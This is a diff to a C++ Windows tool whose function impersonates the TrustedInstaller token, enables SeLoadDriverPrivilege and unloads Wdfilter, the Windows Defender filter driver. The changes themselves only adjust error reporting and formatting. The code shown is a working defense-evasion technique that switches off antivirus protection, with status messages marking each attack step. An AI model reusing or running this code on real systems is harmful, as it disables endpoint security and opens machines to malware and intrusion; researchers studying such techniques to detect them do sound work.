@@ -60,7 +60,6 @@ NTSTATUS ImpersonateAndUnload()
 	}
 	else std::cout << "[+] Successfully started the TrustedInstaller service!\n";
 
-	// step 2 - find the TrustedInstaller process and get a handle to its first thread
 	auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
 	if (trustedInstPid == ERROR_FILE_NOT_FOUND)
 	{
@@ -91,7 +90,7 @@ NTSTATUS ImpersonateAndUnload()
 	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully impersonated TrustedInstaller token!\n";
 	else
 	{
-		Error(GetLastError());
+		Error(RtlNtStatusToDosError(status));
 		std::cout << "[-] Failed to impersonate TrustedInstaller...\n";
 		return 1;
 	}
@@ -103,12 +102,11 @@ NTSTATUS ImpersonateAndUnload()
 	success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
 	if (!success)
 	{
-		Error(GetLastError());
 		std::cout << "[-] Failed to open current thread token, exiting...\n";
 		return 1;
 	}
 	RAII::Handle currentToken = tempHandle;
-
+	
 	success = SetPrivilege(currentToken.GetHandle(), L"SeLoadDriverPrivilege", true);
 	if (!success) return 1;
 
@@ -146,16 +144,12 @@ NTSTATUS ImpersonateAndUnload()
 	RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
 
 	status = NtUnloadDriver(&wdfilterDrivServ);
-	if (status == STATUS_SUCCESS) 
-	{
-		std::cout << "[+] Successfully unloaded Wdfilter!\n";
-	}
+	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully unloaded Wdfilter!\n";
 	else
 	{
-		Error(status);
+		Error(RtlNtStatusToDosError(status));
 		std::cout << "[-] Failed to unload Wdfilter...\n";
 	}
 #pragma endregion Wdfilter is unloaded
-
 	return status;
 }
